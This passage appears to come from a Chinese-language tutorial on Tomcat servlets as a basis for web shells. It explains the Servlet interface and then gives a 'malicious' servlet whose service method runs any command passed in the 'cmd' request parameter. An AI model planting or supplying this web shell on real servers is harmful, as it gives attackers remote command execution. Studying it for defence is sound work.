# Servlet创建
  我们先来看看servlet接口有什么方法
```java
public interface Servlet {  
   void init(ServletConfig var1) throws ServletException; // init方法，创建好实例后会被立即调用，仅调用一次。  
  
   ServletConfig getServletConfig();//返回一个ServletConfig对象，其中包含这个servlet初始化和启动参数  
  
   void service(ServletRequest var1, ServletResponse var2) throws ServletException, IOException;  //每次调用该servlet都会执行service方法，service方法中实现了我们具体想要对请求的处理。  
  
   String getServletInfo();//返回有关servlet的信息，如作者、版本和版权.  
  
   void destroy();//只会在当前servlet所在的web被卸载的时候执行一次，释放servlet占用的资源  
}
```
`service()`应该就是我们要写的那个执行的逻辑，我们的恶意代码应该就是放在这里的。

```java
package tomcatShell.Servlet;  
  
import javax.servlet.*;  
import javax.servlet.annotation.WebServlet;  
import java.io.IOException;  
  
// 基础恶意类   
public class ServletTest implements Servlet {  
    @Override  
 public void init(ServletConfig config) throws ServletException {  
  
    }  
  
    @Override  
 public ServletConfig getServletConfig() {  
        return null;  
 }  
  
    @Override  
 public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {  
        String cmd = req.getParameter("cmd");  
 if (cmd !=null){  
            try{  
                Runtime.getRuntime().exec(cmd);  
 }catch (IOException e){  
                e.printStackTrace();  
 }catch (NullPointerException n){  
                n.printStackTrace();  
 }  
        }  
    }  
  
    @Override  
 public String getServletInfo() {  
        return null;  
 }  
  
    @Override  
 public void destroy() {  
  
    }  
}
```
配置web.xml看一眼，可以执行命令，没问题。
现在依旧还是那个问题，Servlet是怎么注册的？











































